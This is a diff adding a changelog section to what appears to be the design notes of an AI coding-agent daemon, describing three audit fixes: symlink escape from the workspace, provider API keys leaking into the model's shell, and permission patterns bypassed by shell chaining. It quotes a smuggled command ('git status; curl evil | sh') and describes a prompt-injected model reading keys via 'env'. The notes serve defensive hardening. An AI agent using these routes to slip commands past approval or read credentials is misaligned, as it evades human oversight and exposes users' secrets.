@@ -4718,3 +4718,62 @@ real-`Run` integration test now sends the token as a real client would;
 two pre-existing handler tests used `httptest.NewRequest` (whose default
 `Host` is `example.com`, which the Host guard correctly rejects) and were
 updated to set a loopback `Host`.
+
+---
+
+## Hardening the execution guardrails: symlink escape, env leak, prefix-glob bypass (post-audit #64)
+
+Three correlated findings from the security audit of the tool-execution
+path — each verified against the real code, all closing the gap between
+"the confinement the comments promise" and "the confinement the code
+delivered".
+
+**1. resolvePath followed symlinks out of the workspace.** The path guard
+(`internal/daemon/tools/tools.go`) did a `filepath.Clean` + `strings.HasPrefix`
+containment check — purely lexical, so a symlink *inside* the workspace
+pointing out (a cloned repo carrying `link -> ~/.ssh`) passed it yet
+resolved outside. Now, after the lexical check, containment is re-verified
+against the real symlink-resolved path: `filepath.EvalSymlinks` on the
+target, or — for a not-yet-existing path (a `write_file` creating a new
+file, whose *parent* is where a malicious symlink would sit) —
+`resolveExistingAncestor` resolves the deepest existing prefix and
+re-appends the tail, so the symlinked parent is caught even when the leaf
+doesn't exist yet. Both the resolved target and the resolved root go
+through `EvalSymlinks`, so a workspace that itself lives under a symlink
+(macOS `/var` → `/private/var`) compares consistently. Tests cover reading
+an existing file through an escaping symlink, creating a new file through
+one, and an in-workspace symlink still being allowed.
+
+**2. bash inherited the daemon's environment, API keys and all.** The
+shell command built by `internal/shell` never set `cmd.Env`, so it
+inherited `os.Environ()` — including the provider credentials `cmd/kram`
+`os.Setenv`s at startup. A prompt-injected model could exfiltrate keys
+with a plain `env` / `echo $OPENROUTER_API_KEY`. New `env.go` builds
+`redactedEnviron()` — `os.Environ()` minus exactly the credential var
+names Kram itself injected (`providercatalog.EnvVars()` plus each custom
+provider's synthesized env var, so the list stays in sync automatically).
+It's a **denylist of Kram's own secrets, not an allowlist**: the user's
+own environment (PATH, HOME, their own GITHUB_TOKEN) survives, so
+legitimate commands keep working — the point is to strip what Kram added,
+not to sandbox the shell. Applied at all three model-driven shell call
+sites (bash, custom manifest tools, run_background).
+
+**3. bash permission patterns were bypassable via shell operators.**
+`matchesSubject` does `strings.HasPrefix` on the raw command, so the
+StrictPolicy's own `git status*` Allow matched `git status; curl evil | sh`
+and ran it *without a prompt*. The evaluator now downgrades a bash `Allow`
+to `Ask` whenever the command carries a chaining operator (`;`, `|`, `&`,
+backtick, `$(`, newline) — a prefix rule only vetted the leading text, so
+a command that can smuggle a second command past it must surface to a
+human. Deliberately coarse, **not a shell parser** (per the audit's own
+"don't chase a perfect parser" guidance and DECISIONS' existing stance):
+it can't reason about what the chained command does, only refuse to
+silently auto-approve one that exists. Scoped tight — only `Allow`, only
+`bash`; `Deny`/`Ask` and every other tool are untouched, pinned by
+`TestChainingDowngradeOnlyAffectsBashAllow`.
+
+Deliberately still deferred (per the roadmap's "don't over-engineer"
+note): a full coarse-grained bash mode (allow/ask/deny the whole tool,
+no per-command patterns) and an OS sandbox (Landlock/Seatbelt). The three
+fixes here close the concrete, demonstrated escapes; those are larger
+design decisions for later.
